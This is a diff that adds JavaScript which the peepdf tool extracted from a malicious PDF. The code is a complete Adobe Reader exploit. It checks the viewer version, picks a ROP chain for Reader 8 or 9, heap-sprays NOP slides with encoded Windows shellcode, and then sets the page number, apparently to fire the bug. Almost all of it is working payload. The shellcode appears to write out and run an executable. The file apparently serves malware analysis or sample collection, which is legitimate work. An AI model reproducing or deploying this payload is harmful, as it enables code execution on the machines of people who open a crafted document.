@@ -1,0 +1,39 @@
+// peepdf comment: Javascript code located in object 29 (version 0)
+
+function memcopy(slide, times) {
+    ret = "";
+    var i;
+    for (i = 0; i < times; i++) {
+        ret = ret + slide;
+    }
+    return ret;
+}
+var adobe_ver = (app.viewerVersion);
+var shellcode = unescape("%u8b64%u3035%u0000%u8b00%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u8136%u6b3f%u6500%u7500%u81f0%u047f%u0072%u006e%ue775%uc689%u07e9%u0002%u5800%uec81%u0200%u0000%ue789%u7789%u8908%u1047%uec68%u0397%ue80c%u019b%u0000%u4789%u681c%u22f6%u7cb9%u8ee8%u0001%u8900%u2047%ua568%u0017%ue87c%u0181%u0000%u4789%u6824%u97fb%u0ffd%u74e8%u0001%u8900%u2847%u1668%ufa65%ue810%u0167%u0000%u4789%u682c%u791f%ue80a%u5ae8%u0001%u8900%u3047%u2568%uffb0%ue8c2%u014d%u0000%u4789%u6834%u08ac%u76da%u40e8%u0001%u8900%u3847%u9868%u8afe%ue80e%u0133%u0000%u4789%u683c%ub983%u78b5%u26e8%u0001%u8900%u4047%ue668%u8f17%ue87b%u0119%u0000%u4789%u6844%u9bad%udf7d%u0ce8%u0001%u8900%u4847%u77ff%uff10%u3457%uf631%u8d46%u6047%u5650%u57ff%u8348%ufff8%uf274%u003d%u0100%u7600%u89eb%u0447%u7789%uff60%u0477%u406a%u57ff%u891c%u5c47%u006a%u006a%u006a%u77ff%uff60%u3857%uf883%u74ff%u6a4b%u8d00%u705f%uff53%u0477%u77ff%uff5c%u6077%u57ff%u8b2c%u704f%ue983%u8b10%u5c47%u8140%ufd38%u7a46%u7585%u8109%u0478%u38b7%u91da%u0474%uece2%u1aeb%uc083%u8908%u1447%u8140%u2a38%u94f6%u7510%u8109%u0478%ud64a%u937f%u0e74%uece2%u77ff%uff5c%u2057%u850f%uff72%uffff%uc083%u8908%u1847%u006a%u8068%u0000%u6a00%u6a02%u6a00%u6800%u0000%u4000%u77ff%uff10%u2457%u4789%u8b64%u1847%u472b%u8314%u08e8%u5f8b%u8014%u003b%u0874%u3b80%u743e%u8003%u3e33%u4843%uf883%u7500%u6aec%u8d00%u705f%u8b53%u185f%u5f2b%u8314%u08eb%uff53%u1477%u77ff%uff64%u3057%u77ff%uff64%u2857%u016a%u77ff%uff10%u3c57%u006a%u57ff%u6a44%u5000%u57ff%u5540%ue589%u8b57%u087d%uf389%u8b56%u3c73%u748b%u7833%ude01%u8b56%u2076%ude01%uc931%u4149%u01ad%u56d8%uf631%ube0f%u3810%u74d6%uc108%u0dce%ud601%ueb40%u39f1%u5ef7%ue575%u895a%u8bdd%u245a%ueb01%u8b66%u4b0c%u5a8b%u011c%u8beb%u8b04%ue801%u5f5e%uc25d%u0004%uf4e8%ufffd%u73ff%u2e61%u7865%u0065");
+
+function spray_func(shellcode, nop_slide, count) {
+    var sz = 1024;
+    var spray = memcopy(nop_slide, 1024 * 15 - (shellcode.length / 2)) + shellcode;
+    var FirstEntry = memcopy(nop_slide, sz - 18);
+    var OtherEntry = memcopy(nop_slide, sz - 11);
+    var mem = new Array();
+    for (i = 0; i < count; i++) {
+        if (i == 0) {
+            mem[i] = FirstEntry + spray;
+        } else {
+            mem[i] = OtherEntry + spray;
+        }
+    }
+}
+if (adobe_ver < 8) {} else if (adobe_ver < 9) {
+    rop8 = unescape("%u17f2%u4a82%u5000%u4a84%u630f%u4a80%u7ec9%u4a81%u203c%u4a82%u57bc%u4a80%u156a%u4a82%u54e0%u4a82%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u17f2%u4a82%u156a%u4a82%ufe83%u4a81%ue982%u4a81%u0008%u0000%u597d%u4a80%u7ec9%u4a81%u2038%u4a82%u57bc%u4a80%u156a%u4a82%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u17f2%u4a82%u156a%u4a82%ufe83%u4a81%ue982%u4a81%u0008%u0000%u597d%u4a80%u7ec9%u4a81%u2030%u4a82%u57bc%u4a80%u156a%u4a82%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u17f2%u4a82%u5004%u4a84%u630f%u4a80%u17f2%u4a82%u156a%u4a82%ufe83%u4a81%ue982%u4a81%u0030%u0000%u597d%u4a80%u7ec9%u4a81%u5004%u4a84%ua649%u4a81%u17f2%u4a82%u156a%u4a82%ufe83%u4a81%ue982%u4a81%u0020%u0000%u597d%u4a80%u17f2%u4a82%u156a%u4a82%u00a0%u4a82%u7ec9%u4a81%u0034%u0000%u795a%u4a80%u17f2%u4a82%u156a%u4a82%ufe83%u4a81%ue982%u4a81%u000a%u0000%u597d%u4a80%u7ec9%u4a81%u2140%u4a82%u57bc%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u258b%u5000%u4a84%u4d4d");
+    nop_slide8 = unescape("%u12c4%u4a80");
+    spray_func(rop8 + shellcode, nop_slide8, 2000);
+    this.pageNum = 2;
+} else if (adobe_ver < 10) {
+    rop9 = unescape("%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u258b%u0000%u4a8a%u4d4d");
+    nop_slide9 = unescape("%u1064%u4a80");
+    spray_func(rop9 + shellcode, nop_slide9, 2000);
+    this.pageNum = 3;
+}
+
